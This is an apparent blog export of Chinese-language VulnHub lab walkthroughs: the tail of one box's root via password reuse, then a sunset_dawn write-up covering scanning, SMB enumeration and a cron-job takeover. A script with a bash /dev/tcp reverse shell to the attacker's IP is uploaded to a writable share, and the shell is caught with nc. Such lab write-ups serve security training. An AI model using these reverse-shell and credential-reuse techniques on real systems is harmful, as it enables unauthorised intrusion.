uname -a</span><br><span class="hljs-string">Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@ubuntu:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data: </span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: AroundTheWorld</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: </span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br><span class="hljs-string">www-data@ubuntu:/$ ls -liah /home</span><br><span class="hljs-string">ls -liah /home</span><br><span class="hljs-string">total 16K</span><br><span class="hljs-string">393217 drwxr-xr-x  4 root    root    4.0K Jul 22  2019 .</span><br><span class="hljs-string">     2 drwxr-xr-x 24 root    root    4.0K Jul 17  2019 ..</span><br><span class="hljs-string">406288 drwxr-xr-x  2 globus  globus  4.0K Jul 22  2019 globus</span><br><span class="hljs-string">405562 drwxr-xr-x 16 library library 4.0K Jul 22  2019 library</span><br></code></pre></td></tr></table></figure><p>看到有个用户和 ftp 用户重名，那就试试能不能使用 ftp 的密码切换登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@ubuntu:/$ su globus   <br>su globus<br>Password: AroundTheWorld<br><br>globus@ubuntu:~/html$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> globus: AroundTheWorld<br><br>Sorry, user globus may not run sudo on ubuntu.<br></code></pre></td></tr></table></figure><p>成功了，接下来在各个目录进行简单的信息收集，看了用户家目录、passwd 文件权限、定时任务、SUID 文件，查看了进程运行情况，看到了 MySQL，尝试去网站根目录看看有没有数据库连接的密码</p><p>在 library.php 中看到了以下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$DATABASE_HOST</span> = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$DATABASE_USER</span> = <span class="hljs-string">&#x27;username&#x27;</span>;<br><span class="hljs-variable">$DATABASE_PASS</span> = <span class="hljs-string">&#x27;password&#x27;</span>;<br><span class="hljs-variable">$DATABASE_NAME</span> = <span class="hljs-string">&#x27;library&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="密码重用"><a href="#密码重用" class="headerlink" title="密码重用"></a>密码重用</h2><p>尝试使用 <code>password</code> 登录 root 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">globus@ubuntu:~/html$ su root<br>su root<br>Password: password<br><br>root@ubuntu:/var/www/html<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@ubuntu:~<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 64K<br>786434 drwx------ 10 root root 4.0K Jul 22  2019 .<br>     2 drwxr-xr-x 24 root root 4.0K Jul 17  2019 ..<br>788540 -rw-------  1 root root  550 Jul 22  2019 .bash_history<br>789161 -rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br>789160 drwx------  5 root root 4.0K Jul 21  2019 .cache<br>788545 drwxr-xr-x  5 root root 4.0K Jul 17  2019 .config<br>788539 drwx------  3 root root 4.0K Jul 17  2019 .dbus<br>788573 drwxr-xr-x  2 root root 4.0K Jul 21  2019 Desktop<br>788588 drwx------  2 root root 4.0K Jul 21  2019 .gconf<br>788549 drwxr-xr-x  3 root root 4.0K Jul 17  2019 .<span class="hljs-built_in">local</span><br>788553 drwx------  4 root root 4.0K Jul 21  2019 .mozilla<br>786436 -rw-------  1 root root 2.3K Jul 21  2019 .mysql_history<br>788676 drwxr-xr-x  2 root root 4.0K Jul 22  2019 .nano<br>789162 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>788567 -rw-------  1 root root 5.7K Jul 22  2019 .viminfo<br>root@ubuntu:~<span class="hljs-comment"># cd Desktop</span><br><span class="hljs-built_in">cd</span> Desktop<br>root@ubuntu:~/Desktop<span class="hljs-comment"># ls -liah</span><br><span class="hljs-built_in">ls</span> -liah<br>total 8.0K<br>788573 drwxr-xr-x  2 root root 4.0K Jul 21  2019 .<br>786434 drwx------ 10 root root 4.0K Jul 22  2019 ..<br></code></pre></td></tr></table></figure><p>没有 flag 文件，结束战斗！</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sunset_dawn 靶机</title>
    <link href="/2023/08/5d3dbe7ff791.html"/>
    <url>/2023/08/5d3dbe7ff791.html</url>
    
    <content type="html"><![CDATA[<h1 id="sunset-dawn-靶机"><a href="#sunset-dawn-靶机" class="headerlink" title="sunset_dawn 靶机"></a>sunset_dawn 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.134<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-12 13:21 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.134<br>Host is up (0.00035s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>139/tcp  open  netbios-ssn<br>445/tcp  open  microsoft-ds<br>3306/tcp open  mysql<br>MAC Address: 08:00:27:84:97:E0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.46 seconds<br></code></pre></td></tr></table></figure><p>开放了 80,139,445,3306 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo nmap -sT -sV -sC -O -p80,139,445,3306 192.168.56.134<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-12 13:24 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.134<br>Host is up (0.00031s latency).<br><br>PORT     STATE SERVICE     VERSION<br>80/tcp   open  http        Apache httpd 2.4.38 ((Debian))<br>|_http-server-header: Apache/2.4.38 (Debian)<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">445/tcp  open              Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="hljs-string">3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1</span><br><span class="hljs-string">| mysql-info: </span><br><span class="hljs-string">|   Protocol: 10</span><br><span class="hljs-string">|   Version: 5.5.5-10.3.15-MariaDB-1</span><br><span class="hljs-string">|   Thread ID: 16</span><br><span class="hljs-string">|   Capabilities flags: 63486</span><br><span class="hljs-string">|   Some Capabilities: Support41Auth, ConnectWithDatabase, SupportsLoadDataLocal, Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, InteractiveClient, DontAllowDatabaseTableColumn, FoundRows, IgnoreSigpipes, ODBCClient, SupportsCompression, LongColumnFlag, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="hljs-string">|   Status: Autocommit</span><br><span class="hljs-string">|   Salt: &amp;@QV;b_5*ouz)ZgzO[\=</span><br><span class="hljs-string">|_  Auth Plugin Name: mysql_native_password</span><br><span class="hljs-string">MAC Address: 08:00:27:84:97:E0 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: DAWN</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Windows 6.1 (Samba 4.9.5-Debian)</span><br><span class="hljs-string">|   Computer name: dawn</span><br><span class="hljs-string">|   NetBIOS computer name: DAWN\x00</span><br><span class="hljs-string">|   Domain name: dawn</span><br><span class="hljs-string">|   FQDN: dawn.dawn</span><br><span class="hljs-string">|_  System time: 2023-08-12T13:24:44-04:00</span><br><span class="hljs-string">|_clock-skew: mean: 1h19m57s, deviation: 2h18m33s, median: -2s</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string">|_nbstat: NetBIOS name: DAWN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-08-12T17:24:44</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:1:1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 19.87 seconds</span><br></code></pre></td></tr></table></figure><p>Debian 操作系统，Apache httpd 2.4.38</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.134              <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 11:11 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.134<br>Host is up (0.00032s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    open|filtered domain<br>67/udp    closed        dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   closed        msrpc<br>137/udp   open          netbios-ns<br>138/udp   open|filtered netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   closed        snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   open|filtered route<br>631/udp   open|filtered ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  closed        nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 08:00:27:84:97:E0 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.04 seconds<br></code></pre></td></tr></table></figure><p>UDP 端口无收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo nmap --script=vuln -p80,139,445,3306 192.168.56.134<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 11:17 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.134<br>Host is up (0.00031s latency).<br><br>PORT     STATE SERVICE<br>80/tcp   open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /logs/: Logs</span><br><span class="hljs-string">139/tcp  open  netbios-ssn</span><br><span class="hljs-string">445/tcp  open  microsoft-ds</span><br><span class="hljs-string">3306/tcp open  mysql</span><br><span class="hljs-string">|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)</span><br><span class="hljs-string">MAC Address: 08:00:27:84:97:E0 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">|_smb-vuln-ms10-061: false</span><br><span class="hljs-string">| smb-vuln-regsvc-dos: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="hljs-string">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="hljs-string">|       while working on smb-enum-sessions.</span><br><span class="hljs-string">|_          </span><br><span class="hljs-string">|_smb-vuln-ms10-054: false</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 71.14 seconds</span><br></code></pre></td></tr></table></figure><p>80 端口发现 logs 目录</p><h2 id="ftp-和-MySQL-渗透"><a href="#ftp-和-MySQL-渗透" class="headerlink" title="ftp 和 MySQL 渗透"></a>ftp 和 MySQL 渗透</h2><p>尝试一下 ftp 匿名登陆和 MySQL 无密码登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ ftp 192.1.1.142           <br>Connected to 192.1.1.142.<br>220 (vsFTPd 3.0.3)<br>Name (192.1.1.142:kali): anonymous<br>331 Please specify the password.<br>Password: <br>530 Login incorrect.<br>ftp: Login failed<br><br>┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ mysql -u root -h 192.168.56.134 -p<br>Enter password: <br>ERROR 1045 (28000): Access denied <span class="hljs-keyword">for</span> user <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;192.168.56.106&#x27;</span> (using password: NO)<br></code></pre></td></tr></table></figure><h2 id="smb-渗透"><a href="#smb-渗透" class="headerlink" title="smb 渗透"></a>smb 渗透</h2><p>尝试登录 smb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo smbmap -H 192.168.56.134      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>[+] IP: 192.168.56.134:445      Name: 192.168.56.134                                    <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        ITDEPT                                                  READ ONLY       PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.<br>        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.5-Debian)<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ smbclient //192.168.56.134/ITDEPT  <br>Password <span class="hljs-keyword">for</span> [WORKGROUP\kali]:<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a list of possible commands.<br>smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Fri Aug  2 23:23:20 2019<br>  ..                                  D        0  Fri Aug  2 23:21:39 2019<br><br>                7158264 blocks of size 1024. 0 blocks available<br>smb: \&gt; <span class="hljs-built_in">pwd</span><br>Current directory is \\192.168.56.134\ITDEPT\<br></code></pre></td></tr></table></figure><p>可以登录但是空空如也，尝试了一下，可以上传文件，没有进一步的信息可以利用，先去网站看看</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>查看 web 界面的同时开始目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo dirsearch -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545<br><br>Output File: /root/.dirsearch/reports/192.168.56.134/_23-08-12_14-35-08.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-12_14-35-08.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.134/<br><br>[14:35:08] Starting: <br>[14:35:12] 301 -  315B  - /logs  -&gt;  http://192.168.56.134/logs/           <br>[14:35:25] 301 -  315B  - /cctv  -&gt;  http://192.168.56.134/cctv/           <br>[14:38:41] 403 -  302B  - /server-status<br></code></pre></td></tr></table></figure><p>尝试访问 logs 和 cctv 目录，cctv 无权限，logs 目录可以看到文件列表</p><p><img src="/pic/9b7c85c695c6864d446624ac5ac3407d_MD5.png"></p><p>再一次对 cctv 目录进行爆破，防止漏信息</p><p><img src="/pic/84f2fa0ffe6905abef075e3736788df7_MD5.png"></p><p>全是 404 和 403，看来突破口不在这</p><h2 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h2><p>回看 logs 目录，发现前几个文件都没有权限范围，management.log 打开是一个日志信息，通过观察发现文件应该是由 pspy64 生成的。但却没有进一步的信息，我在这里遇到了很大的问题，日志文件中没有什么有价值的信息</p><p><img src="/pic/4fa48da37429639e64d9e552e4f5a19b_MD5.png"></p><p>刚开始我以为是乱码问题导致的，换了几种编码方式都没有预想中的效果，在这里又尝试了对 ftp 和 MySQL 进行了密码爆破，但都失败了，80 端口界面中没有特别有价值的信息</p><p><img src="/pic/ab90672e5df01e38b3791b8270f8f438_MD5.png"></p><p>这里真的快山穷水尽了，卡了一整天，没办法选择了看 WP，而别人笔记里的 management.log 是有提示信息的，经过再一次排查，我发现我的日志信息里没有更新进一步的信息，而正常打靶的笔记里，这个文件是会定时更新的。尝试先恢复快照再重启，重新打开日志目录，发现 management.log 文件大概 3 min 刷新一次，这才是正常的靶机环境……</p><h2 id="定时任务Getshell"><a href="#定时任务Getshell" class="headerlink" title="定时任务Getshell"></a>定时任务Getshell</h2><p>有点无语，接着打吧，后续的过程就简单很多了，首先看看日志文件里的信息</p><p><img src="/pic/d4a38812ad23e72bd0dcc585cc94ea06_MD5.png"></p><p>应当是一个定时任务，而其中的目录信息和我们刚才 smb 共享的目录名是同一个，这就比较有意思了</p><p>我们可以尝试通过 smb 上传同名的恶意文件到 ITDEPT 目录中，然后等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ <span class="hljs-built_in">cat</span> web-control         <br><span class="hljs-comment">#!/bin/bash</span><br>/bin/bash -i &gt;&amp; /dev/tcp/192.68.156.106/443 0&gt;&amp;1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; put web-control <br>putting file web-control as \web-control (3.1 kb/s) (average 3.7 kb/s)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dawn]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.134] 40794<br>sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux dawn 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:84:97:e0 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.134/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 443sec preferred_lft 443sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe84:97e0/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@dawn:~$</span><br></code></pre></td></tr></table></figure><p>基础的信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dawn:~/html$ <span class="hljs-built_in">ls</span> -alih<br><span class="hljs-built_in">ls</span> -alih<br>total 24K<br>16513 drwxr-xr-x 4 root root 4.0K Aug  3  2019 .<br>16512 drwxr-xr-x 3 root root 4.0K Aug  1  2019 ..<br>11120 drw------- 2 root root 4.0K Aug  1  2019 cctv<br>11145 -rw-r--r-- 1 root root  791 Aug  3  2019 index.html<br> 9264 -rw-r--r-- 1 root root 1.0K Aug  3  2019 .index.html.swp<br>16523 drwxr-xr-x 2 root root 4.0K Aug  1  2019 logs<br>www-data@dawn:~/html$ <span class="hljs-built_in">cd</span> cctv   <br><span class="hljs-built_in">cd</span> cctv<br>bash: <span class="hljs-built_in">cd</span>: cctv: Permission denied<br>www-data@dawn:~/html$ <span class="hljs-built_in">cat</span> .index.html.swp<br><span class="hljs-built_in">cat</span> .index.html.swp<br>b0nano 3.2rootdawn/var/www/html/index.htmlU<br><br>www-data@dawn:/home/dawn$ sudo -l<br>sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> www-data on dawn:<br>    